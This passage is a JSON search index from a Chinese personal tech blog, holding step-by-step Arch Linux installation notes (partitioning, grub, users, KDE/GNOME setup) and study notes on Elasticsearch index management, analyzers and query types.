","date":"2020-10-22","objectID":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/:14:1","tags":null,"title":"Metaspolit5笔记","uri":"/2020/10/metaspolit5%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"验证启动模式（BIOS 还是 EFI） 要验证启动模式，请用下列命令列出 efivars 目录： # ls /sys/firmware/efi/efivars 如果命令没有错误地显示了目录，则系统以 UEFI 模式启动。 如果目录不存在，系统可能以 BIOS 模式 (或 CSM 模式) 启动。 ","date":"2020-10-20","objectID":"/2020/10/arch%E5%AE%89%E8%A3%85/:0:1","tags":null,"title":"Arch安装","uri":"/2020/10/arch%E5%AE%89%E8%A3%85/"},{"categories":null,"content":"连接到因特网 用下面步骤设置网络： 确保系统已经启用了 网络接口，用 ip-link(8) 检查: ip link 对于无线网络，请确保无线网卡未被 rfkill 禁用。 要连接到网络: 有线以太网 —— 连接网线 WiFi —— 使用 iwctl 验证无线网络 配置网络连接: DHCP: 动态 IP 地址和 DNS 服务器分配 (由 systemd-networkd 和 systemd-resolved 提供) 对于 有线 和 无线 网络接口来说应该能开箱即用。 静态 IP 地址: 按照 Network configuration#Static IP address 进行操作。 用 ping 检查网络连接: ","date":"2020-10-20","objectID":"/2020/10/arch%E5%AE%89%E8%A3%85/:0:2","tags":null,"title":"Arch安装","uri":"/2020/10/arch%E5%AE%89%E8%A3%85/"},{"categories":null,"content":"WIFI 连接 输入 iwctl 进入 iwd 模式，输入 device list 查看你的网卡名字，这里假设是 wlan0，输入 station wlan0 scan 检查扫描网络，输入 station wlan0 get-networks 查看网络名字，假设名字叫 BUPT-portal，输入 station wlan0 connect BUPT-portal 接着输入密码（如果有密码的话），输入 exit 退出 iwd 模式 ","date":"2020-10-20","objectID":"/2020/10/arch%E5%AE%89%E8%A3%85/:0:3","tags":null,"title":"Arch安装","uri":"/2020/10/arch%E5%AE%89%E8%A3%85/"},{"categories":null,"content":"测试网络 ping baidu.com 使用 reflector 来获取速度最快的 6 个镜像，并将地址保存至/etc/pacman.d/mirrorlist reflector -c China -a 6 --sort rate --save /etc/pacman.d/mirrorlist ","date":"2020-10-20","objectID":"/2020/10/arch%E5%AE%89%E8%A3%85/:0:4","tags":null,"title":"Arch安装","uri":"/2020/10/arch%E5%AE%89%E8%A3%85/"},{"categories":null,"content":"更新系统时间 使用 timedatectl(1) 确保系统时间是准确的： timedatectl set-ntp true 可以使用 timedatectl status 检查服务状态。 ","date":"2020-10-20","objectID":"/2020/10/arch%E5%AE%89%E8%A3%85/:0:5","tags":null,"title":"Arch安装","uri":"/2020/10/arch%E5%AE%89%E8%A3%85/"},{"categories":null,"content":"建立硬盘分区 磁盘若被系统识别到，就会被分配为一个**块设备**，如 /dev/sda, /dev/nvme0n1 或 /dev/mmcblk0。可以使用 **lsblk** 或者 fdisk 查看： fdisk -l 结果中以 rom，loop 或者 airoot 结束的可以被忽略 对于一个选定的设备，以下的分区是必须要有的： 一个根分区（挂载在 根目录）/； 要在 UEFI 模式中启动，还需要一个 EFI 系统分区。 用 cfdisk 分区 ","date":"2020-10-20","objectID":"/2020/10/arch%E5%AE%89%E8%A3%85/:0:6","tags":null,"title":"Arch安装","uri":"/2020/10/arch%E5%AE%89%E8%A3%85/"},{"categories":null,"content":"格式化分区 当分区建立好了，这些分区都需要使用适当的 文件系统 进行格式化。举个例子，如果根分区在 /dev/sdX1 上并且要使用 Ext4 文件系统，运行： mkfs.ext4 /dev/sdX1 如果创建了 交换分区 (例如 /dev/sda3)，请使用 mkswap(8) 将其初始化： mkswap /dev/sdX2 swapon /dev/sdX2 ","date":"2020-10-20","objectID":"/2020/10/arch%E5%AE%89%E8%A3%85/:0:7","tags":null,"title":"Arch安装","uri":"/2020/10/arch%E5%AE%89%E8%A3%85/"},{"categories":null,"content":"挂载分区 将根分区**挂载**到 /mnt，例如： mount /dev/sdX1 /mnt mkdir /mnt/boot mount /dev/sdX2 /mnt/boot 然后使用 mkdir(1) 创建其他剩余的挂载点（比如 /mnt/efi）并挂载其相应的分区。 稍后 genfstab(8) 将自动检测挂载的文件系统和交换空间。 ","date":"2020-10-20","objectID":"/2020/10/arch%E5%AE%89%E8%A3%85/:0:8","tags":null,"title":"Arch安装","uri":"/2020/10/arch%E5%AE%89%E8%A3%85/"},{"categories":null,"content":"选择镜像 文件 /etc/pacman.d/mirrorlist 定义了软件包会从哪个**镜像源**下载。在 LiveCD 启动的系统上，在连接到因特网后，**reflector** 会通过选择最近一个小时已同步的 HTTPS 镜像并按下载速率对其进行排序来更新镜像列表。 在列表中越前的镜像在下载软件包时有越高的优先权。您或许想检查一下文件，看看是否满意。如果不满意，可以相应的修改 /etc/pacman.d/mirrorlist 文件，并将地理位置最近的镜像源挪到文件的头部，同时也应该考虑一些其他标准。 这个文件接下来还会被 pacstrap 拷贝到新系统里，所以请确保设置正确。 ","date":"2020-10-20","objectID":"/2020/10/arch%E5%AE%89%E8%A3%85/:0:9","tags":null,"title":"Arch安装","uri":"/2020/10/arch%E5%AE%89%E8%A3%85/"},{"categories":null,"content":"安装必须的软件包 使用 pacstrap 脚本，安装 base 软件包和 Linux **内核**以及常规硬件的固件： pacstrap /mnt base linux linux-firmware base-devel 除了这些包以外，我们还可以安装许多其他的包，其中一个比较重要的就是一定要装上一个网络管理器，不然你的新系统启动以后连不上网就傻了。 pacstrap /mnt networkmanager vim networkmanager 用来联网，vim 用来编辑配置文件。只要能连上网，别的软件都可以晚点装，所以目前装这么多东西就足够了。 生成分区表： genfstab -U /mnt \u003e\u003e /mnt/etc/fstab 由于这步比较重要，所以我们需要输出生成的文件来检查是否正确，执行以下命令： cat /mnt/etc/fstab 进入新系统： arch-chroot /mnt 这里顺便说一下，如果以后我们的系统出现了问题，只要插入 U 盘并启动， 将我们的系统根分区挂载到了/mnt 下（如果有 efi 分区也要挂载到/mnt/boot 下），再通过这条命令就可以进入我们的系统进行修复操作。 设置时区和硬件时间： ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime hwclock --systoh 本地化设置，使用 vim 打开/etc/locale.gen，把en_US.UTF-8 UTF-8和zh_CN.UTF-8 UTF-8取消注释，然后保存退出。运行下面两条命令： locale-gen echo LANG=en_US.UTF-8 \u003e\u003e /etc/locale.conf 设置网络(这里的 myhostname 取一个自己喜欢的名字)： echo myhostname \u003e\u003e /etc/hostname 使用 vim 打开/etc/hosts，在里面输入（myhostname 换成上面自己取的名字）： 127.0.0.1 localhost ::1 localhost 127.0.1.1 myhostname.localdomain myhostname 设置 root 用户的密码（连输两遍，输入时无显示）： passwd intel 的 CPU 安装intel-ucode，amd 的 CPU 安装amd-ucode。如果不太确定自己的 cpu 型号，可以安装一个neofetch，然后使用neofetch进行查看。 *# 可选项* pacman -S neofetch neofetch *# 查看cpu和显卡信息# 必选项* pacman -S intel-ucode pacman -S amd-ucode *# 根据实际情况安装* ","date":"2020-10-20","objectID":"/2020/10/arch%E5%AE%89%E8%A3%85/:0:10","tags":null,"title":"Arch安装","uri":"/2020/10/arch%E5%AE%89%E8%A3%85/"},{"categories":null,"content":"安装Bootloader 这里我们安装最流行的Grub2。（如果曾经装过Linux，记得删掉原来的Grub，否则不可能成功启动） 首先安装os-prober和ntfs-3g这两个包，它可以配合Grub检测已经存在的系统，自动设置启动选项。 pacman -S os-prober ntfs-3g ","date":"2020-10-20","objectID":"/2020/10/arch%E5%AE%89%E8%A3%85/:0:11","tags":null,"title":"Arch安装","uri":"/2020/10/arch%E5%AE%89%E8%A3%85/"},{"categories":null,"content":"如果为 BIOS/MBR 引导方式： 安装grub包： pacman -S grub 部署 grub grub-install --target=i386-pc /dev/sdx （将sdx换成你安装的硬盘） 生成配置文件： grub-mkconfig -o /boot/grub/grub.cfg ","date":"2020-10-20","objectID":"/2020/10/arch%E5%AE%89%E8%A3%85/:0:12","tags":null,"title":"Arch安装","uri":"/2020/10/arch%E5%AE%89%E8%A3%85/"},{"categories":null,"content":"如果为 EFI/GPT 引导方式： 安装grub与efibootmgr两个包： pacman -S grub efibootmgr dialog pacman -S network-manager-applet mtools dosfstools base-devel linux-headers 部署grub： grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=grub 生成配置文件： grub-mkconfig -o /boot/grub/grub.cfg 如果报warning failed to connect to lvmetad，falling back to device scanning.错误。参照这篇文章，简单的方法是编辑/etc/lvm/lvm.conf这个文件，找到use_lvmetad = 1将1修改为0，保存，重新配置 grub。 如果报grub-probe: error: cannot find a GRUB drive for /dev/sdb1, check your device.map类似错误，并且sdb1这个地方是你的 u 盘，这是 u 盘uefi分区造成的错误，对我们的正常安装没有影响，可以不用理会这条错误。 如果你是多系统，请注意上面一节中对os-prober这个包的安装。 强烈建议使用如下命令检查是否成功生成各系统的入口，如果没有正常生成会出现开机没有系统入口的情况： vim /boot/grub/grub.cfg 检查接近末尾的menuentry部分是否有windows或其他系统名入口。 如果你没有看到 Arch Linux 系统入口或者该文件不存在，请先检查/boot 目录是否正确部署 linux 内核： ls /boot 查看是否有 initramfs-linux-fallback.img initramfs-linux.img intel-ucode.img vmlinuz-linux 这几个文件，如果都没有，说明 linux 内核没有被正确部署，很有可能是/boot 目录没有被正确挂载导致的，确认/boot 目录无误后，可以重新部署 linux 内核： pacman -S linux 再重新生成配置文件，就可以找到系统入口。还要重新生成 fstab 退出系统，准备关机了： exit 如果挂载了/mnt/boot，先umount /mnt/boot，再umount /mnt，否则直接umount /mnt： umount /mnt/boot umount /mnt reboot ","date":"2020-10-20","objectID":"/2020/10/arch%E5%AE%89%E8%A3%85/:0:13","tags":null,"title":"Arch安装","uri":"/2020/10/arch%E5%AE%89%E8%A3%85/"},{"categories":null,"content":"安装网络 systemctl enable --now NetworkManager nmtui #用这个图像连接网络 #或者用下面的方法： #nmcli device wifi list # 搜索网络，一下子没出来可以过几秒再试试 #nmcli device wifi connect SSID password password # 上面的SSID和password分别换成自己家网络的wifi名和密码# 显然取一个不带中文的wifi名还是蛮重要的 ","date":"2020-10-20","objectID":"/2020/10/arch%E5%AE%89%E8%A3%85/:1:0","tags":null,"title":"Arch安装","uri":"/2020/10/arch%E5%AE%89%E8%A3%85/"},{"categories":null,"content":"声卡驱动 sudo pacman -S alsa-utils pulseaudio-alsa pulseaudio ","date":"2020-10-20","objectID":"/2020/10/arch%E5%AE%89%E8%A3%85/:2:0","tags":null,"title":"Arch安装","uri":"/2020/10/arch%E5%AE%89%E8%A3%85/"},{"categories":null,"content":"添加用户 连接上互联网以后，我们需要为自己创建一个普通用户账号，一直使用root不太好。username可以改成自己喜欢的用户名，m表示创建用户的家目录~，G表示把用户放进wheel这个组。 useradd -m -G wheel username 创建完用户以后，设置一下用户的密码： passwd username 为了让普通用户能够暂时获得管理权限，我们需要安装sudo包： pacman -S sudo 安装完毕以后，使用 vim 打开/etc/sudoers，找到wheel ALL=(ALL) ALL这一行取消注释，然后使用:wq!强制改写该文件，使得wheel这个组内的用户都可以使用sudo。 使用su username（username 换成自己刚刚设置好的名字）换成普通用户登录系统，我们就可以正式开始使用 archlinux 系统了。 ","date":"2020-10-20","objectID":"/2020/10/arch%E5%AE%89%E8%A3%85/:3:0","tags":null,"title":"Arch安装","uri":"/2020/10/arch%E5%AE%89%E8%A3%85/"},{"categories":null,"content":"安装 Xorg Xorg是Linux下的一个著名的开源图形服务，我们的桌面环境需要Xorg的支持。 执行如下命令安装Xorg及相关组件： udo pacman -S xorg ","date":"2020-10-20","objectID":"/2020/10/arch%E5%AE%89%E8%A3%85/:3:1","tags":null,"title":"Arch安装","uri":"/2020/10/arch%E5%AE%89%E8%A3%85/"},{"categories":null,"content":"安装桌面环境 Linux下有很多著名的桌面环境如Xfce、KDE(Plasma)、Gnome、Unity、Deepin等等，它们的外观、操作、设计理念等各方面都有所不同， 在它们之间的比较与选择网上有很多的资料可以去查。 更多桌面环境的安装指南请见下面的链接： https://wiki.archlinux.org/index.php/Desktop_environment#List_of_desktop_environments ","date":"2020-10-20","objectID":"/2020/10/arch%E5%AE%89%E8%A3%85/:3:2","tags":null,"title":"Arch安装","uri":"/2020/10/arch%E5%AE%89%E8%A3%85/"},{"categories":null,"content":"安装 KDE(Plasma) 直接安装软件包组（包含了很多软件包）即可 sudo pacman -S plasma kde-applications packagekit-qt5 #packagekit-qt5为了使discover工作正常 ","date":"2020-10-20","objectID":"/2020/10/arch%E5%AE%89%E8%A3%85/:3:3","tags":null,"title":"Arch安装","uri":"/2020/10/arch%E5%AE%89%E8%A3%85/"},{"categories":null,"content":"安装桌面管理器 安装好了桌面环境包以后，我们需要安装一个图形化的桌面管理器来帮助我们登录并且选择我们使用的桌面环境，这里我推荐使用sddm。 ","date":"2020-10-20","objectID":"/2020/10/arch%E5%AE%89%E8%A3%85/:3:4","tags":null,"title":"Arch安装","uri":"/2020/10/arch%E5%AE%89%E8%A3%85/"},{"categories":null,"content":"kde安装 sddm sddm 已经被包含进plasma中，无需另外安装 systemctl enable sddm ","date":"2020-10-20","objectID":"/2020/10/arch%E5%AE%89%E8%A3%85/:3:5","tags":null,"title":"Arch安装","uri":"/2020/10/arch%E5%AE%89%E8%A3%85/"},{"categories":null,"content":"gnome 安装 gdm 同时你可能需要安装工具栏工具来显示网络设置图标（某些桌面环境已经装了，但是为了保险可以再装一下）： #sudo pacman -S network-manager-applet 现在不用下也有 双系统和 win10 时间不一样： sudo timedatectl set-local-rtc true ","date":"2020-10-20","objectID":"/2020/10/arch%E5%AE%89%E8%A3%85/:3:6","tags":null,"title":"Arch安装","uri":"/2020/10/arch%E5%AE%89%E8%A3%85/"},{"categories":null,"content":"安装字体 yay -S noto-fonts-cjk ttf-dejavu GNOME Shell 扩展 可以在 aur 中搜索 gnome-shell-extension-扩展名 安装，如： **yay -S gnome-shell-extension-dash-to-dock** 或者到 GNOME Shell Extensions 网站搜索下载，然后 gnome-tweak-tool 里安装启用。也可以使用浏览器安装，需要安装插件，请参考Arch Wiki。 以下是我在使用的一些扩展： User Themes 启用后可自定义 shell 主题 Place status indicator 显示文件管理器导航菜单 Removable drive menu 显示可移除设备（如 U 盘）拔插提示 Workspace indicator 在顶栏显示当前示工作区的序号 Top panel workspace scroll 在顶栏上滚动鼠标滚轮来快速切换工作区 Dash to Dock 可以将左侧的 dash 改为置于底部的 dock 栏 OpenWeather 在顶栏显示天气情况 Media player indicator 显示音乐播放器的状态 Battery status 显示电池电量百分比 Netspeed 在顶栏上显示网速 # tray icon 托盘图标 yay -S gnome-shell-extension-appindicator ","date":"2020-10-20","objectID":"/2020/10/arch%E5%AE%89%E8%A3%85/:4:0","tags":null,"title":"Arch安装","uri":"/2020/10/arch%E5%AE%89%E8%A3%85/"},{"categories":null,"content":"降级软件包 下载 downgrade ","date":"2020-10-20","objectID":"/2020/10/arch%E5%AE%89%E8%A3%85/:5:0","tags":null,"title":"Arch安装","uri":"/2020/10/arch%E5%AE%89%E8%A3%85/"},{"categories":null,"content":"问题： [pulseaudio] bluez5-util.c: GetManagedObjects() failed: org.freedesktop.systemd1.NoSuchUnit: Unit dbus-org.bluez.service not found. Solution: # systemctl enable bluetooth.service ","date":"2020-10-20","objectID":"/2020/10/arch%E5%AE%89%E8%A3%85/:6:0","tags":null,"title":"Arch安装","uri":"/2020/10/arch%E5%AE%89%E8%A3%85/"},{"categories":null,"content":"guake 在 wayland 下问题解决： 在系统设置的设置快捷键下设置一个快捷键 f12 ,命令是 guake -t 参考： 2020 Archlinux 双系统安装教程（超详细） Installation guide (简体中文) 以官方 Wiki 的方式安装 ArchLinux 安装 archlinux 系统【2020.03.15】 图形界面安装： ArchLinux 安装后的必须配置与图形界面安装教程 小新 air14 睡眠问题： Lenovo IdeaPad 5 14are05 ","date":"2020-10-20","objectID":"/2020/10/arch%E5%AE%89%E8%A3%85/:6:1","tags":null,"title":"Arch安装","uri":"/2020/10/arch%E5%AE%89%E8%A3%85/"},{"categories":null,"content":"全文检索 是指在全文数据中检索单个文档或文档集合的搜索技术。 全文数据：像文章、网页、邮件这种全文本数据 文档：全文本数据中的一条数据 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:1:0","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"倒排索引 倒排索引先将文档中包含的关键字全部提取出来，然后将关键字与文档的对应关系保存起来，最后再对关键字本身做索引排序 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:2:0","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"elasticsearch 索引 elasticsearch 中所有数据的检索都必须要通过倒排索引来检索。所以将文档的容器直接称为索引，这里的索引就是倒排索引，更准确的说是一组倒排索引。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:3:0","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"分区 为了避免重新索引导致的严重性能开销，elasticsearch 对索引分片数量做了一个严格的限制，就是索引分片数量一旦在创建索引时确定后就不能再修改了。 但无论容量规划得多科学依然不能完全避免文档实际存储量与索引容量不想等的情况。唯一可行的情况就是创建新的索引，再将原索引中的文档存储到新索引中 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:4:0","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"索引别名 _alias 和_aliases 接口设置别名 _rollover 用于根据一系列条件将别名指向一个新的索引 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:4:1","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"索引配置 setting 索引关闭和打开 _close ,_open ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:5:0","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"动态字段 dynamic: true 默认，支持动态增加新字段 false,新字段依然会被保存到文档中，只是这个字段的定义不会被添加到索引映射的字段字段定义中。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:6:0","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"动态模板 用于自定义动态添加字段时的映射规则。通过索引映射类型的 dynamic_templates 参数设置 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:7:0","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"索引模板 在创建索引时默认为索引添加的别名，配置，和映射关系等。分别通过index_patterns,aliases,setting,mapping设置。可通过_template接口创建 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:8:0","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"_split 接口 在新索引中将每个主分区分裂为两个或更多分区，所以分区数量都是成倍增加而不能逐个增加。分裂虽然会创建新的索引，但是新索引中的数据只是通过文件系统硬连接到新的索引中，所以不存在复制。分片又是在本地分裂，不存在网络传输，所以效率还是比较高的。 需要预先设置 number_of_routing_shards 参数 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:9:0","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"_shrink接口 用于缩减索引分片 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:10:0","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"_reindex接口 将文档从一个索引重新索引到另一个索引中。不会将原索引的配置信息复制到新索引中。必须将索引的_source字段开启 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:11:0","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"_refresh接口 主动刷新一个或多个索引，将已经添加的文档编入索引使它们在检索时可见 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:12:0","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"_cache接口 用于主动清理缓存，需要在_cache后附加关键字clear。 clear?query=true clear?request=true clear?fielddata=true\u0026fields=notes query:节点查询缓存，负责存储节点查询的结果。一个节点只有一个缓存，同一个节点上的分片共享一个缓存。默认开启。默认使用节点内存的 10%作为上线 request：分片请求缓存，负责存储分片接受到的查询结果。不会缓存查询结果的 hits 字段，也就是具体的文档内容，它一般 之缓存聚集查询的相关结结果。默认开启。 fielddata：将 text 类型字段提取到所有词项全部加载到内存中，以提高使用该字段做排序和聚集运算的效率。由于 fielddata 是 text 对文档值机制的替代，所以天然开启且无法关闭。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:13:0","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"_stats接口 查看运行状态 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:14:0","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"_shard_stores和_segments接口 _shard_stores用于查询索引分片存储情况 _segments用于查看底层 Lucene 的分段情况 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:15:0","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"索引文档 将文档分析处理后编入索引以使文档可检索。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:16:0","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"获取文档 获取单个文档 如GET /test/_doc/1 获取多个文档 如 GET _mget { \"docs\":[ \"_index\":\"students\", \"_id\":\"1\", \"_source\":{ \"include\":[\"name\"], \"exclude\":[\"gender\"] } ] } ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:16:1","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"删除文档 根据 id 根据查询条件 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:16:2","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"更新文档 _update接口：用于解决更新文档单个字段的问题。困纯属 doc 参数指明要更新的字段。还可以用 scipt 参数设置更新脚本，一般用 Painless 语言 _update_by_query接口：根据查询条件更新 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:16:3","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"批量操作 _bulk接口：接受一族请求体，请求体一般分为两组，第一个代表操作文档的类型，第二个代表操作文档所需的参数。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:16:4","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"分析与检索 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:17:0","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"_search 接口 两种方式：基于 URI 和基于请求体 基于 URI： GET index/_search?q=message:chrome firefox 基于请求体： GET index/_saerch { \"query\":{ \"term\":{ \"DestCountry\":\"CN\" } } } mat_all和match_none: GET index/_saerch { \"query\":{ \"match_all\":{} } } ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:17:1","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"分页与排序 from参数代表索引文档的起始位置，size代表每次检索文档的数量，默认为 10。 form 和 size 处理时会将所有的数据全部取出来，再截取范围内返回。 scroll参数类似数据库游标的文档遍历机制。 POST index/_search?scroll=2m\u0026size=1000 { \"query\":{ \"term\":{ \"message\":\"chrome\" } } } scroll 参数只能在 URI 中使用，2m 代表我分钟，1h 代表 1 小时。这个保留时长是处理单次遍历所需要的时间。返回结果包含了一个scroll_id，下次根据这个 id 进行查询就可以遍历了。 POST _search/scroll { \"scroll\":\"2m\", \"scroll_id\":\"...\" } scoll 也会将数据整体加载进来，不同的是 from/size 每次请求都会加载，scroll 只在初始时加载。 search_after定义检索应该在文档某些字段的值之后查询其他文档。 sort参数代表排序。 _source代表字段投影，只返回需要的字段，也可以设置include和exclude字段。 stored_fields指定哪些被存储的字段出现在结果中。当然这些字段的store属性要设为 true，默认不返回_source docvalue_fields用于将文档字段以文档值机制保存的值返回。返回的结果默认会包含_source字段 script_fields可以通过脚本向检索结果中添加字段。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:17:2","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"分析器与规整器 文档分析器是用于文档分析的组件，通常由字符过滤器、分词器和分词过滤器组成。它们就像连接在一起的管道。 除了分析器外，还有一种称为规整器的文档标准化工具。与分析器最大的区别在于规整器没有分词器，所以它能保证分析后的结果只有一个分词。文档规整器只能应用于字段类型为 keyword 的字段，可通过 normalizer 参数配置字段规整器。规整器的作用就是对 keyword 字段做标准化处理，比如将字段值转换为小写字母等等。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:17:3","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"standard 分析器 分词规则是根据 Unicode 文本分隔规范中定义的标准分隔符区分词项。 没有字符过滤器，但包含三个词项过滤器： 标准词项过滤器：只是占位，实际没有任何处理 小写字母过滤器：将词项转换为小写字母 停止词过滤器：将停止词删除，默认关闭 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:17:4","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"stop 分析器 使用小写字母分词器，分词规则是使用所有非字母分隔单词。 没有字符过滤器，但包含一个停止词过滤器。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:17:5","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"pattern 分析器 使用模式分词器，使用 Java 正则表达式匹配文本以提取词项。 没有字符过滤器，包含两个分词过滤器：小写字母过滤器和停止词过滤器 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:17:6","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"simple 分析器 使用小写字母分词器，没有过滤器 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:17:7","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"keyword 分析器 不做任何处理的分析器，使用的分词器是关键字分词器。 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:17:8","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"中文分析器 IK ik_smart:提取颗粒度最粗 ik_max_word:提取颗粒度最细 叶子查询与模糊查询 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:17:9","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"基于词项的查询 精确匹配查询条件，不会对查询条件做分词、规范化等预处理。所以一般不对 text 类型字段做检索，而用于类似数值、日期、枚举类型等结构化数据的精确匹配。 term 查询 对字段做单词项的精确匹配 terms 查询 类似 in 操作，在一组指定的词项范围内匹配字段值 terms_set 查询 与 terms 类似，不同的是被匹配的字段类型是数组，接受以数组类型表示的多个词项，被匹配的字段只要包含期望词项中的几个即可。具体数量有两种设置方式，一种是通过minimum_should_match_field指定，另一种通过minimum_should_match_script range 查询 用于匹配一个字段是否在指定范围内，一般用于具有数字、日期等结构化数据类型的字段 exists 查询 用于检索指定字段不为空的文档。 在验证非空时需要明确什么样的值是空，什么值不是空。默认情况下，字段空值与 java 语言的空值相同都是 null.空值字段不会被索引，也就不可检索 ","date":"2020-10-16","objectID":"/2020/10/elastic%E7%AC%94%E8%AE%B0/:18:0","tags":null,"title":"Elastic笔记","uri":"/2020/10/elastic%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"使用模式匹配 prefix 查询 检索字段值中包含指定前缀的文档 wildcard 查询 允许在查询条件中使用通配符*和?，*代表 0 个或多个字符，?代表单个字符 regexp 查询 正则查询 type 查询:根据映射类型做查询，由于 6.0 版本后只能定义一个_doc映射类型，故没用了 ids 查询：根据一组 id 值查询 停止词： 出现在文档中但并不会编入索引中的词项就是停止词。一般在定制分析器时预先定义好，文档在编入索引时分析器就会将这些停止词从文档中剔除。 common 查询 将词项分为重要词项和非重要词项。使用cutoff_frequency设置词频来判定是否是重要词项， 